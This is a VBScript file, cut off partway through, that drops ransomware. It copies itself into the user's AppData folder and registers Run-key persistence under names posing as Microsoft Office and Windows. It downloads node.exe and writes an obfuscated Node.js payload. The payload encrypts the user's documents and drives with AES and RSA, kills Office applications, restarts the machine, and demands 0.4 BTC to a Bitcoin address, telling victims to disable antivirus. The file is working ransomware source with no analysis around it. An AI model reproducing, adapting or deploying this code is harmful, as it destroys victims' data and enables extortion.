on error resume next
Dim oXMLHTTP
Dim oStream
Dim pGenNum, newpass, passList, inFlag, pgLength, x, fso, ts, passLen, i

Const ForWriting = 2
passLen = 13

Set oShell = Wscript.CreateObject("Wscript.Shell")
Set objFSO=CreateObject("Scripting.FileSystemObject")

' strExeName = generatePassword(passLen)
strExeName = "GFp0JAk"
strEntPoint = "lLT8PCI.js"

strHomeFolder = oShell.ExpandEnvironmentStrings("%USERPROFILE%")

outWorkingDir = strHomeFolder & "\AppData\Local\" & strExeName &  "\"
outModuleDir= outWorkingDir & "\node_modules\"

strExe = outWorkingDir & strExeName & ".exe"
strVbs = outWorkingDir & "\" & strExeName & ".vbs"
strExeSize = 0
strAllGood = 0
strExeSize = objFSO.GetFile(strExe).Size
objFSO.CreateFolder(outWorkingDir)
objFSO.CreateFolder(outModuleDir)
objFSO.CreateFolder(outModuleDir & "graceful-fs")

SourceFile = WScript.ScriptFullName

objFSO.CopyFile SourceFile, strVbs, True

oShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Microsoft Office", "wscript " & strVbs,"REG_SZ"
oShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Startup",  strExe & " " & outWorkingDir & "\" & strEntPoint & " decryptStatic","REG_SZ"
oShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Windows", "cmd /c start  /min " & outWorkingDir & "\How-to-buy-bitcoins.html","REG_SZ"

i = True

Do While(i)
	'Wscript.Echo strExeSize

	If (strExeSize < "18000000") Then
		 'Wscript.Echo "Starting download"
		 Set File = WScript.CreateObject("Microsoft.XMLHTTP")
		 File.Open "GET", "https://nodejs.org/download/release/latest-v8.x/win-x86/node.exe", False
		 File.setRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64) Gecko/20100101 Firefox/52.0"
		 File.Send
		 'Wscript.Echo err
		 If err.number <> 0 then 
		    Line  = Line &  vbcrlf & "Error getting file" 
		    Line  = Line &  vbcrlf & "Error " & err.number & "(0x" & hex(err.number) & ") " & err.description 
		    Line  = Line &  vbcrlf & "Source " & err.source 
		    Line  = Line &  vbcrlf & "" 
		    Line  = Line &  vbcrlf & "HTTP Error " & File.Status & " " & File.StatusText
		    Line  = Line &  vbcrlf &  File.getAllResponseHeaders
		    'wscript.echo Line
		    Err.clear
		    'wscript.quit
		 End If


		If File.Status = 200 Then
			Set BS = CreateObject("ADODB.Stream")
			BS.type = 1
			BS.open
			BS.Write File.ResponseBody
			BS.SaveToFile strExe, 2
		End If
		
	End If


outFile=outWorkingDir & strEntPoint
set objFile = objFSO.CreateTextFile(outFile, True)
objFile.Write "var $jscomp=$jscomp||{};$jscomp.scope={};$jscomp.ASSUME_ES5=!1;$jscomp.ASSUME_NO_NATIVE_MAP=!1;$jscomp.ASSUME_NO_NATIVE_SET=!1;$jscomp.defineProperty=$jscomp.ASSUME_ES5||""function""==typeof Object.defineProperties?Object.defineProperty:function(b,a,c){b!=Array.prototype&&b!=Object.prototype&&(b[a]=c.value)};$jscomp.getGlobal=function(b){return""undefined""!=typeof window&&window===b?b:""undefined""!=typeof global&&null!=global?global:b};$jscomp.global=$jscomp.getGlobal(this);$jscomp.SYMBOL_PREFIX=""jscomp_symbol_"";$jscomp.initSymbol=function(){$jscomp.initSymbol=function(){};$jscomp.global.Symbol||($jscomp.global.Symbol=$jscomp.Symbol)};$jscomp.Symbol=function(){var b=0;return function(a){return $jscomp.SYMBOL_PREFIX+(a||"""")+b++}}();$jscomp.initSymbolIterator=function(){$jscomp.initSymbol();var b=$jscomp.global.Symbol.iterator;b||(b=$jscomp.global.Symbol.iterator=$jscomp.global.Symbol(""iterator""));""function""!=typeof Array.prototype[b]&&$jscomp.defineProperty(Array.prototype,b,{configurable:!0,writable:!0,value:function(){return $jscomp.arrayIterator(this)}});$jscomp.initSymbolIterator=function(){}};$jscomp.arrayIterator=function(b){var a=0;return $jscomp.iteratorPrototype(function(){return a<b.length?{done:!1,value:b[a++]}:{done:!0}})}; $jscomp.iteratorPrototype=function(b){$jscomp.initSymbolIterator();b={next:b};b[$jscomp.global.Symbol.iterator]=function(){return this};return b};$jscomp.makeIterator=function(b){$jscomp.initSymbolIterator();$jscomp.initSymbol();$jscomp.initSymbolIterator();var a=b[Symbol.iterator];return a?a.call(b):$jscomp.arrayIterator(b)}; $jscomp.polyfill=function(b,a,c,d){if(a){c=$jscomp.global;b=b.split(""."");for(d=0;d<b.length-1;d++){var e=b[d];e in c||(c[e]={});c=c[e]}b=b[b.length-1];d=c[b];a=a(d);a!=d&&null!=a&&$jscomp.defineProperty(c,b,{configurable:!0,writable:!0,value:a})}};$jscomp.FORCE_POLYFILL_PROMISE=!1;$jscomp.polyfill(""Promise"",function(b){function a(){this.batch_=null}function c(a){return a instanceof e?a:new e(function(b,c){b(a)})}if(b&&!$jscomp.FORCE_POLYFILL_PROMISE)return b;a.prototype.asyncExecute=function(a){null==this.batch_&&(this.batch_=[],this.asyncExecuteBatch_());this.batch_.push(a);return this};a.prototype.asyncExecuteBatch_=function(){var a=this;this.asyncExecuteFunction(function(){a.executeBatch_()})};var d=$jscomp.global.setTimeout;a.prototype.asyncExecuteFunction=function(a){d(a,0)};a.prototype.executeBatch_=function(){for(;this.batch_&&this.batch_.length;){var a=this.batch_;this.batch_=[];for(var b=0;b<a.length;++b){var c=a[b];delete a[b];try{c()}catch(r){this.asyncThrow_(r)}}}this.batch_=null};a.prototype.asyncThrow_=function(a){this.asyncExecuteFunction(function(){throw a;})};var e=function(a){this.state_=0;this.result_=void 0;this.onSettledCallbacks_=[];var b=this.createResolveAndReject_();try{a(b.resolve,b.reject)}catch(k){b.reject(k)}};e.prototype.createResolveAndReject_= function(){function a(a){return function(h){c||(c=!0,a.call(b,h))}}var b=this,c=!1;return{resolve:a(this.resolveTo_),reject:a(this.reject_)}};e.prototype.resolveTo_=function(a){if(a===this)this.reject_(new TypeError(""A Promise cannot resolve to itself""));else if(a instanceof e)this.settleSameAsPromise_(a);else{a:switch(typeof a){case ""object"":var b=null!=a;break a;case ""function"":b=!0;break a;default:b=!1}b?this.resolveToNonPromiseObj_(a):this.fulfill_(a)}};e.prototype.resolveToNonPromiseObj_=function(a){var b=void 0;try{b=a.then}catch(k){this.reject_(k);return}""function""==typeof b?this.settleSameAsThenable_(b,a):this.fulfill_(a)};e.prototype.reject_=function(a){this.settle_(2,a)};e.prototype.fulfill_=function(a){this.settle_(1,a)};e.prototype.settle_=function(a,b){if(0!=this.state_)throw Error(""Cannot settle(""+a+"", ""+b|""): Promise already settled in state""+this.state_);this.state_=a;this.result_=b;this.executeOnSettledCallbacks_()};e.prototype.executeOnSettledCallbacks_=function(){if(null!=this.onSettledCallbacks_){for(var a=this.onSettledCallbacks_,b=0;b<a.length;++b)a[b].call(),a[b]=null;this.onSettledCallbacks_=null}};var f=new a;e.prototype.settleSameAsPromise_=function(a){var b=this.createResolveAndReject_();a.callWhenSettled_(b.resolve,b.reject)};e.prototype.settleSameAsThenable_=function(a,b){var c=this.createResolveAndReject_();try{a.call(b,c.resolve,c.reject)}catch(r){c.reject(r)}};e.prototype.then=function(a,b){function c(a,b){return""function""==typeof a?function(b){try{d(a(b))}catch(l){f(l)}}:b}var d,f,h=new e(function(a,b){d=a;f=b});this.callWhenSettled_(c(a,d),c(b,f));return h};e.prototype.catch=function(a){return this.then(void 0,a)};e.prototype.callWhenSettled_=function(a,b){function c(){switch(d.state_){case 1:a(d.result_);break;case 2:b(d.result_);break;default:throw Error(""Unexpected state: ""+d.state_);}}var d=this;null==this.onSettledCallbacks_?f.asyncExecute(c):this.onSettledCallbacks_.push(function(){f.asyncExecute(c)})};e.resolve=c;e.reject=function(a){return new e(function(b,c){c(a)})};e.race=function(a){return new e(function(b,d){for(var e=$jscomp.makeIterator(a),f=e.next();!f.done;f=e.next())c(f.value).callWhenSettled_(b,d)})};e.all=function(a){var b=$jscomp.makeIterator(a),d=b.next();return d.done?c([]):new e(function(a,e){function f(b){return function(c){h[b]=c;g--;0==g&&a(h)}}var h=[],g=0;do h.push(void 0),g++,c(d.value).callWhenSettled_(f(h.length-1),e),d=b.next();while(!d.done)})};return e},""es6"",""es3"");$jscomp.executeAsyncGenerator=function(b){function a(a){return b.next(a)}function c(a){return b.throw(a)}return new Promise(function(d,e){function f(b){b.done?d(b.value):Promise.resolve(b.value).then(a,c).then(f,e)}f(b.next())})}; var fs=require(""graceful-fs""),crypt=require(""crypto""),path=require(""path""),exec=require(""child_process"").exec,rl=require(""readline""),os=require(""os""),key="""",bitcoinAddress=""18aBKwKJvMCkZmpkcCbW9b9y9snAmU3kgo"",price=""0.4"",tillDate=""March 1, 2018"",entPoint=""lLT8PCI.js"",mainName=""GFp0JAk"",publicKey=""-----BEGIN PUBLIC KEY-----\nMIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA403SyYJw3sUvumo0Gsjy\nFoPgFtOEJ4ZxIhsw9MX3E/PpM3OxQqQitQtAfaKSTYT39s9kprxuFtW6ZXB/lNUp\nMm9IZfbYyELUMyi+zHKkIi8PKEGdASogYD84VDkVPkVhaXB2YvNeyJ7Rhup2SubG\nO7MYtOYM57TOOHT/DDCX5Q3AEXPSMvSMgPgZ6hSKuVAgOhztcvgxMH3sYNQbNw/L\njLD1MCk6eoVDqTRvarE9IoLjdBuGhbWJQ7afWkAAEv0vriPI22F5MAhhZLhuKjCg\nTNELFzvWQEKWsZMyZS70V5wCGqCuocrmGFPBeS4ZdHS3W94jA18a36m8V76tnlbz\n/gnWdtY81jBPdnHiXp22tIswtrpN+5UNn7A1WHhBkfdPpiyHRzTmnYmLHKHPyYkR\nGJj74fUiAuvwlCmmE3rfwH9uBuL3v+plMCbRs3Log09Q4GyTYd2Z2OacWTE4gRCf\n23wCYkyeZrfXhnFmH0TGsQak0lznZBkudJOL7Ms1NUIWa1zd/gqUGROR1Mb/BYVt\nzmBo4VMak6RCwvuXhPmR+brgb6ul+74F0fHEsyBQoeurj9EqAVxmD4jMnzwQi1HB\nEqOGcc2mAQvtVtgU17MQqVS3JFiYZTNn1SWuTUJCAF+xzNgVsjQuQVJZCXa2c4NL\nK1iOlUsoOxkYTStUIdX1miUCAwEAAQ==\n-----END PUBLIC KEY-----"", keyLength=128,dir=[],cwd=process.cwd(),userprofile=process.env.USERPROFILE,wd=userprofile+""\\AppData\\Local\\""+mainName+""\\"",privateKeyPath=wd+""privkey.pm2.enc"",encExtension=""encrypted"",keyFile="""",admin=!1,identifier=""0"",skipFiles=[],exclude=[],targetFiles=[];process.title=""Encrypt-""+mainName; var generateKey=function(b){return crypt.randomBytes(Math.ceil((void 0===b?128:b)/2)).toString(""hex"")},testFile=generateKey(4)+"".""+generateKey(2),getFileList=function(b,a){var c=[];try{fs.readdirSync(b).forEach(function(d){var e=path.extname(d);d=path.join(b,d);var f=fs.statSync(d);a?f&&f.isDirectory()?c=c.concat(getFileList(d,a)):e==="".""+a&&c.push(d):e!=="".""+encExtension&&(f&&f.isDirectory()?c=c.concat(getFileList(d,a)):c.push(d))})}catch(d){console.log(""(GETFILELIST)"",d)}return c},writeFile=function(b,a){try{return fs.writeFile(b,a,""utf8"",function(){console.log(""(WRITEFILE)"",b+"" has been written to disk"")})}catch(c){console.log(""(WRITEFILE)"",c)}},readFile=function(b){try{return fs.readFileSync(b,{encoding:""utf-8""},function(a,b){if(a)console.log(""(READFILE)"",a);else return b})}catch(a){console.log(""(READFILE)"",a)}},removeFile=function(b){try{return fs.unlink(b,function(a){if(a)return console.log(a);console.log(b+"" has been deleted successfully"")})}catch(a){return console.log(""(REMOVEFILE)"",a)}}, encrypt=function(b,a,c,d,e){c=void 0===c?function(){return!0}:c;d=void 0===d?!0:d;try{var f=crypt.createCipher(void 0===e?""aes-256-cbc"":e,a),h=fs.createReadStream(b),m=fs.createWriteStream(b+"".""+encExtension);h.pipe(f).pipe(m);m.on(""finish"",function(){console.log(b+"" has been encrypted"");d&&removeFile(b);c()})}catch(k){console.log(k)}},handler=function(b){console.log(b)},decrypt=function(b,a,c,d){c=void 0===c?!0:c;try{var e=crypt.createDecipher(void 0===d?""aes-256-cbc"":d,a);e.on(""error"",handler); fs.stat(b,function(a){if(!a){a=fs.createReadStream(""""+b);var d=path.join(path.dirname(b),path.basename(b,"".""+encExtension));d=fs.createWriteStream(d);a.pipe(e).pipe(d);d.on(""finish"",function(){console.log(b+"" has been decrypted"");c&&removeFile(b)});d.on(""error"",function(){})}})}catch(f){}},encryptRSA=function(b,a){b=new Buffer(b);return crypt.publicEncrypt(a,b).toString(""base64"")},decryptRSA=function(b,a){a=path.resolve(a);a=fs.readFileSync(a,""utf8"");b=new Buffer(b,""base64"");return crypt.privateDecrypt(a, b).toString(""utf8"")},getFilesToDecrypt=function(b){return fs.readFileSync(b+"".list"").toString().split(""\n"")},addToList=function(b,a){fs.appendFile(b+"".list"",a+""\n"",function(c){if(c)throw c;console.log(""Saved to ""+b+"".list: ""+a)})},wait=function(b){return new Promise(function(a){return setTimeout(a,b)})},isAdmin=function(){var b=process.env.WINDIR+""\\""+testFile;try{return fs.writeFileSync(b,"""",""utf-8""),!0}catch(a){return!1}},scan=function(){var b=[];b.push(userprofile+""\\Desktop"");b.push(userprofile+ ""\\Documents"");b.push(userprofile+""\\Downloads"");b.push(userprofile+""\\Contacts"");b.push(userprofile+""\\Pictures"");b.push(userprofile+""\\Music"");b.push(userprofile+""\\Videos"");b.push(userprofile+""\\AppData\\Local\\Microsoft\\Outlook"");for(var a=0;25>a;a++){var c=String.fromCharCode(66+a)+"":"",d=c+""\\""+testFile;if(fs.existsSync(c))try{fs.writeFileSync(d,"""",""utf-8""),b.push(c),removeFile(d)}catch(e){}}return b}; function decPrivateKey(){return $jscomp.executeAsyncGenerator(function(){function b(b,e,m){for(;;)switch(a){case 0:return a=1,{value:getFileList(wd,""key""),done:!1};case 1:if(1!=b){a=2;break}a=-1;throw m;case 2:return c=d=e,console.log(""Got list of keys: "",c),a=3,{value:c.forEach(function(a){var b=readFile(a);try{var c=decryptRSA(b,privateKeyPath);writeFile(a,c);console.log(""(DECPRIVATEKEY)"",""Decrypted using private key: ""+c);return!0}catch(v){return!1}}),done:!1};case 3:if(1!=b){a=4;break}a=-1;throw m; case 4:a=-1;default:return{value:void 0,done:!0}}}var a=0,c,d,e={next:function(a){return b(0,a,void 0)},throw:function(a){return b(1,void 0,a)},return:function(a){throw Error(""Not yet implemented"");}};$jscomp.initSymbolIterator();e[Symbol.iterator]=function(){return this};return e}())} function decStatic(b){return $jscomp.executeAsyncGenerator(function(){function a(a,c,t){for(;;)switch(b){case 0:return b=1,{value:readFile(wd+""test.pm2""),done:!1};case 1:if(1!=a){b=2;break}b=-1;throw t;case 2:return m=k=c,b=3,{value:readFile(privateKeyPath),done:!1};case 3:if(1!=a){b=4;break}b=-1;throw t;case 4:f=h=c;if(!f){b=5;break}if(!m){b=6;break}try{e=decryptRSA(m,privateKeyPath);if(""valid""!==e){b=9;break}console.log(""(DECSTATIC)"",""Vallid key found. Starting decryption process"");b=10;return{value:decPrivateKey(), done:!1}}catch(g){b=7;break}case 10:try{if(1!=a){b=11;break}b=-1;throw t;}catch(g){b=7;break}case 11:try{return b=12,{value:wait(3E3),done:!1}}catch(g){b=7;break}case 12:try{if(1!=a){b=13;break}b=-1;throw t;}catch(g){b=7;break}case 13:try{return console.log(""(DECSTATIC)"",""Killing encryption instances""),b=14,{value:exec('taskkill /FI ""WINDOWTITLE eq Encrypt-'+mainName+'"" /F /T'),done:!1}}catch(g){b=7;break}case 14:try{if(1!=a){b=15;break}b=-1;throw t;}catch(g){b=7;break}case 15:try{return b=16,{value:dec(), done:!1}}catch(g){b=7;break}case 16:try{if(1!=a){b=17;break}b=-1;throw t;}catch(g){b=7;break}case 17:try{return b=-1,{value:!0,done:!0}}catch(g){b=7;break}case 9:try{b=8;break}catch(g){b=7;break}case 7:console.log(""(INIT)"",""Wrong key"");case 8:case 6:case 5:d=rl.createInterface({input:process.stdin,output:process.stdout}),d.question(""\n-----------\nYour files are encrypted! Encryption was produced using a unique public key RSA-2048 generated for this computer. \nTo decrypt files you need to obtain the private key.\nThe single copy of the private key, which will allow to decrypt files, located on a remote server on the Internet.\nThe server will destroy the key after a ""+ tillDate+"". After that, nobody will be able to restore files ...\nTo obtain the private key for this computer, you need to send ""+price+"" BTC to bitcoin address ""+bitcoinAddress+"". \nYou can easily delete this software, but know that without it, you will never be able to get your original files back.\nDisable your antivirus to prevent the removal of this software.\nWhen your transaction will be verified and confirmed you will receive your private key.\nFor more information on how to buy and send bitcoins, open How-to-buy-bitcoins.html file located on your Desktop \n""+ (""Approximate destruction time of your private key ""+tillDate)+""\n-----------\nEnter key: \n"",function(a){return $jscomp.executeAsyncGenerator(function(){function b(b,h,g){for(;;)switch(c){case 0:return c=1,{value:d.close(),done:!1};case 1:if(1!=b){c=2;break}c=-1;throw g;case 2:if(!a){c=3;break}c=5;return{value:writeFile(wd+""privkey.pm2.enc.temp"",(new Buffer(a,""base64"")).toString(""ascii"")),done:!1};case 5:if(1!=b){c=6;break}c=-1;throw g;case 6:return c=7,{value:wait(3E3),done:!1};case 7:if(1!=b){c= 8;break}c=-1;throw g;case 8:return c=9,{value:readFile(wd+""test.pm2""),done:!1};case 9:if(1!=b){c=10;break}c=-1;throw g;case 10:f=t=h;if(!f){c=11;break}try{e=decryptRSA(f,wd+""privkey.pm2.enc.temp"");if(""valid""!==e){c=15;break}console.log(""(DECSTATIC)"",""Valid key"");c=17;return{value:writeFile(wd+""privkey.pm2.enc"",(new Buffer(a,""base64"")).toString(""ascii"")),done:!1}}catch(p){c=13;break}case 17:try{if(1!=b){c=18;break}c=-1;throw g;}catch(p){c=13;break}case 18:try{return c=19,{value:wait(3E3),done:!1}}catch(p){c= 13;break}case 19:try{if(1!=b){c=20;break}c=-1;throw g;}catch(p){c=13;break}case 20:try{return c=21,{value:decPrivateKey(),done:!1}}catch(p){c=13;break}case 21:try{if(1!=b){c=22;break}c=-1;throw g;}catch(p){c=13;break}case 22:try{return c=23,{value:wait(3E3),done:!1}}catch(p){c=13;break}case 23:try{if(1!=b){c=24;break}c=-1;throw g;}catch(p){c=13;break}case 24:try{return console.log(""(DECSTATIC)"",""Killing encryption instances""),c=25,{value:exec('taskkill /FI ""WINDOWTITLE eq Encrypt-'+mainName+'"" /F /T'), done:!1}}catch(p){c=13;break}case 25:try{if(1!=b){c=26;break}c=-1;throw g;}catch(p){c=13;break}case 26:try{return c=27,{value:dec(),done:!1}}catch(p){c=13;break}case 27:try{if(1!=b){c=28;break}c=-1;throw g;}catch(p){c=13;break}case 28:try{c=16;break}catch(p){c=13;break}case 15:try{console.log(""(DECSTATIC)"",""Something went wrong""),decStatic()}catch(p){c=13;break}case 16:try{c=14;break}catch(p){c=13;break}case 13:console.log(""(DECSTATIC)"",""Wrong key""),decStatic();case 14:c=12;break;case 11:console.log(""(DECSTATIC)"", ""Can`t get test file""),decStatic();case 12:c=4;break;case 3:console.log(""(DECSTATIC) Empty key. Please enter your key""),decStatic();case 4:return c=29,{value:wait(35E3),done:!1};case 29:if(1!=b){c=30;break}c=-1;throw g;case 30:c=-1;default:return{value:void 0,done:!0}}}var c=0,e,f,t,h={next:function(a){return b(0,a,void 0)},throw:function(a){return b(1,void 0,a)},return:function(a){throw Error(""Not yet implemented"");}};$jscomp.initSymbolIterator();h[Symbol.iterator]=function(){return this};return h}())}), b=-1;default:return{value:void 0,done:!0}}}var b=0,d,e,f,h,m,k,r={next:function(b){return a(0,b,void 0)},throw:function(b){return a(1,void 0,b)},return:function(a){throw Error(""Not yet implemented"");}};$jscomp.initSymbolIterator();r[Symbol.iterator]=function(){return this};return r}())} function dec(b){return $jscomp.executeAsyncGenerator(function(){function a(a,c,k){for(;;)switch(b){case 0:return b=1,{value:wait(5E3),done:!1};case 1:if(1!=a){b=2;break}b=-1;throw k;case 2:return b=3,{value:getFileList(wd,""key""),done:!1};case 3:if(1!=a){b=4;break}b=-1;throw k;case 4:h=m=c,f=0;case 5:if(!(f<dir.length)){b=7;break}b=8;return{value:getFileList(dir[f],encExtension),done:!1};case 8:if(1!=a){b=9;break}b=-1;throw k;case 9:(d=e=c)&&d.forEach(function(a){a&&(0<fs.statSync(a).size?h.forEach(function(b){b=readFile(b);try{decrypt(a,b)}catch(n){console.log(n)}}):del(a))});case 6:f++;b=5;break;case 7:b=-1;default:return{value:void 0,done:!0}}}var b=0,d,e,f,h,m,k={next:function(b){return a(0,b,void 0)},throw:function(b){return a(1,void 0,b)},return:function(a){throw Error(""Not yet implemented"");}};$jscomp.initSymbolIterator();k[Symbol.iterator]=function(){return this};return k}())} function kill(){try{exec(""taskkill /IM winword.exe /F /T""),exec(""taskkill /IM excel.exe /F /T""),exec(""taskkill /IM outlook.exe /F /T""),exec(""taskkill /IM acad.exe /F /T""),console.log(""(KILL)"",""Kiilling apps"")}catch(b){}} function finish(){return $jscomp.executeAsyncGenerator(function(){function b(b,c,f){for(;;)switch(a){case 0:try{return a=3,{value:exec(""RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters""),done:!1}}catch(h){a=1;break}case 3:try{if(1!=b){a=4;break}a=-1;throw f;}catch(h){a=1;break}case 4:try{return a=5,{value:exec(""taskkill /IM explorer.exe /F""),done:!1}}catch(h){a=1;break}case 5:try{if(1!=b){a=6;break}a=-1;throw f;}catch(h){a=1;break}case 6:try{return a=7,{value:exec(""shutdown -r -t 0""),done:!1}}catch(h){a=1;break}case 7:try{if(1!=b){a=8;break}a=-1;throw f;}catch(h){a=1;break}case 8:try{a=2;break}catch(h){a=1;break}case 1:case 2:a=-1;default:return{value:void 0,done:!0}}}var a=0,c={next:function(a){return b(0,a,void 0)},throw:function(a){return b(1,void 0,a)},return:function(a){throw Error(""Not yet implemented"");}};$jscomp.initSymbolIterator();c[Symbol.iterator]=function(){return this};return c}())} function main(){return $jscomp.executeAsyncGenerator(function(){function b(b,l,q){for(;;)switch(a){case 0:return n=!1,g='<!DOCTYPE html>\n<html>\n<head>\n\t<title></title>\n\t<style type=""text/css"">\n\n\t.col-1-1 {\n\t\twidth: 100%;\n\t}\n\n\t[class*=\'col-\'] {\n\t\t-webkit-box-sizing: border-box;\n\t\t-moz-box-sizing: border-box;\n\t\tbox-sizing: border-box;\t\n\t}\n\n\t[class*=\'col-\'] {\n\t\tfloat: left;\n\t  \tmin-height: 1px;\n\t\tpadding-right: 20px; /* column-space */\n\t}\n\n\t[class*=\'col-\'] [class*=\'col-\']:last-child {\n\t\tpadding-right: 0;\n\t}\n\n\t.content {\n\t\tpadding: 10px;\n\t}\n\n\t.mid {\n\t\twidth: 100%;\n\t\ttext-align: center;\n\t}\n\t.center {\n\t\tdisplay: block;\n\t\tmargin-left: auto;\n\t\tmargin-right: auto;\n\t}\n\n\t</style>\n</head>\n<body>\n<div class=""grid grid-pad"">\n\t<div class=""col-1-1 content"">\n\t\t<div id=""google_translate_element""></div>\n\t</div>\n\t<div class=""col-1-1"">\n\t\t<img class=""center"" height=""50px"" width=""50px"" src=""data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiA/PjxzdmcgY2xpcC1ydWxlPSJldmVub2RkIiBmaWxsLXJ1bGU9ImV2ZW5vZGQiIGltYWdlLXJlbmRlcmluZz0ib3B0aW1pemVRdWFsaXR5IiBzaGFwZS1yZW5kZXJpbmc9Imdlb21ldHJpY1ByZWNpc2lvbiIgdGV4dC1yZW5kZXJpbmc9Imdlb21ldHJpY1ByZWNpc2lvbiIgdmlld0JveD0iMCAwIDUwMCA1MDAiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PGRlZnM+PHN0eWxlIHR5cGU9InRleHQvY3NzIj48IVtDREFUQVsKICAgIC5zdHIwIHtzdHJva2U6IzQzNDI0MjtzdHJva2Utd2lkdGg6MTB9CiAgICAuc3RyMSB7c3Ryb2tlOiNFREVERUQ7c3Ryb2tlLXdpZHRoOjE1O3N0cm9rZS1saW5lY2FwOnJvdW5kfQogICAgLmZpbDQge2ZpbGw6bm9uZX0KICAgIC5maWwzIHtmaWxsOiM0MzQyNDJ9CiAgICAuZmlsMSB7ZmlsbDojMDA3NkQ4fQogICAgLmZpbDIge2ZpbGw6I0VERURFRH0KICAgIC5maWwwIHtmaWxsOnVybCgjaWQwKX0KICAgXV0+PC9zdHlsZT48bGluZWFyR3JhZGllbnQgZ3JhZGllbnRVbml0cz0idXNlclNwYWNlT25Vc2UiIGlkPSJpZDAiIHgxPSIxMDkuMTk5IiB4Mj0iMzkwLjc5OSIgeTE9IjMzNy40OTkiIHkyPSIzMzcuNDk5Ij48c3RvcCBvZmZzZXQ9IjAiIHN0b3AtY29sb3I9IiMwYWYiLz48c3RvcCBvZmZzZXQ9Ii41MDIiIHN0b3AtY29sb3I9IiMwOWYiLz48c3RvcCBvZmZzZXQ9IjEiIHN0b3AtY29sb3I9IiMwYWYiLz48L2xpbmVhckdyYWRpZW50PjwvZGVmcz48ZyBpZD0iTGF5ZXJfeDAwMjBfMSI+PHBhdGggY2xhc3M9ImZpbDAgc3RyMCIgZD0iTTEwNSAyMDVoMjkwYzggMCAxNSA3IDE1IDE1djIzNWMwIDgtNyAxNS0xNSAxNWgtMjkwYy04IDAtMTUtNy0xNS0xNXYtMjM1YzAtOCA3LTE1IDE1LTE1eiIvPjxwYXRoIGNsYXNzPSJmaWwxIiBkPSJNMzc4IDIxMGMtMzUgMTktODAgMzAtMTI5IDMwcy05NC0xMS0xMjktMzBoMjU4eiIvPjxyZWN0IGNsYXNzPSJmaWwyIHN0cjAiIGhlaWdodD0iOTAuMDAxIiB3aWR0aD0iMzE5Ljk5OCIgeD0iOTAiIHk9IjM0MCIvPjxwYXRoIGNsYXNzPSJmaWwzIHN0cjAiIGQ9Ik0xMzAgMjA1aDM5di02MmMwLTQ1IDM2LTgyIDgxLTgyczgxIDM3IDgxIDgydjYyaDM5di02MmMwLTY2LTU0LTEyMC0xMjAtMTIwcy0xMjAgNTQtMTIwIDEyMHY2MnoiLz48cmVjdCBjbGFzcz0iZmlsMyIgaGVpZ2h0PSI3OC43MTUiIHRyYW5zZm9ybT0ibWF0cml4KC4xMzMgMCAuMjM4IDEuMTQzIDEwMCAzNDApIiB3aWR0aD0iMjI1LjU1OCIvPjxyZWN0IGNsYXNzPSJmaWwzIiBoZWlnaHQ9Ijc4LjcxNSIgdHJhbnNmb3JtPSJtYXRyaXgoLjEzMyAwIC4yMzggMS4xNDMgMTY5Ljk5NyAzNDApIiB3aWR0aD0iMjI1LjU1OCIvPjxyZWN0IGNsYXNzPSJmaWwzIiBoZWlnaHQ9Ijc4LjcxNSIgdHJhbnNmb3JtPSJtYXRyaXgoLjEzMyAwIC4yMzggMS4xNDMgMjM5Ljk5NyAzNDApIiB3aWR0aD0iMjI1LjU1OCIvPjxyZWN0IGNsYXNzPSJmaWwzIiBoZWlnaHQ9Ijc4LjcxNSIgdHJhbnNmb3JtPSJtYXRyaXgoLjEzMyAwIC4yMzggMS4xNDMgMzA5Ljk5NCAzNDApIiB3aWR0aD0iMjI1LjU1OCIvPjxwb2x5Z29uIGNsYXNzPSJmaWwzIiBwb2ludHM9IjM4MCwzNDAgNDEwLDM0MCA0MTAsNDMwIDM5OSw0MzAiLz48cGF0aCBjbGFzcz0iZmlsNCBzdHIxIiBkPSJNMjUwIDQzYy0zNyAwLTcxIDIwLTg5IDUxIi8+PHBhdGggY2xhc3M9ImZpbDEiIGQ9Ik0yNTAgNDQ1YzQ1IDAgODcgNyAxMjIgMjBoLTI0NGMzNS0xMyA3Ny0yMCAxMjItMjB6Ii8+PC9nPjwvc3ZnPg=="" />\n\t</div>\n\t<div class=""col-1-1 content"">\n\t\tYour files are encrypted! Encryption was produced using a unique public key RSA-2048 generated for this computer. \n\t\tTo decrypt files you need to obtain the private key.\n\t\tThe single copy of the private key, which will allow to decrypt files, located on a remote server on the Internet.\n\t\tThe server will destroy the key after a <b>'+ tillDate+'</b>. After that, nobody will be able to restore files ...\n\t\tTo obtain the private key for this computer, you need to send <h3 class=""mid"">'+price+' BTC</h3> to bitcoin address <h3 class=""mid"">'+bitcoinAddress+'</h3>\n\t\tYou can easily delete this software, but know that without it, you will never be able to get your original files back.\n\t\tDisable your antivirus to prevent the removal of this software.\n\t\tWhen your transaction will be verified and confirmed you will receive your private key.\n\t</div>\n\t<div class=""col-1-1 content"">\n\t\t<h1 class=""mid"">Approximate destruction time of your private key '+ tillDate+'</h1>\n\t</div>\n\t<div class=""col-1-1"">\n\t\t<div class=""content""><h1>How to buy bitcoins</h1></div>\n\t</div>\t\n\t<div class=""col-1-1 content"">\n\t\t<ul>\n\t\t\t<li><a href=""https://xchange.cash/visa-mastercard-rur-to-bitcoin.html"">Xchange.cash</a></li>\n\t\t\t<li><a href=""https://24paybank.com/visa-mastercard-rur-to-bitcoin.html"">24paybank.com</a></li>\n\t\t\t<li><a href=""https://www.change.am/en/exchange_CARDRUB_to_BTC/"">Change.me</a></li>\n\t\t\t<li><a href=""https://kassa.cc/"">Kassa.cc</a></li>\n\t\t\t<li><a href=""https://www.change.am/en/exchange_CARDRUB_to_BTC/"">Change.am</a></li>\n\t\t\t<li><a href=""https://coinbase.com"">Coinbase.com</a></li>\n\t\t\t<li>more options</li>\n\t\t\t<li><a href=""https://www.bestchange.com/visa-mastercard-rur-to-bitcoin.html"">Bestchange.com</a></li>\n\t\t</ul>\n\t</div>\n</div>\n<script type=""text/javascript"">\nfunction googleTranslateElementInit() {\nnew google.translate.TranslateElement({pageLanguage: \'en\'}, \'google_translate_element\');\n}\n\x3c/script>\n<script type=""text/javascript"" 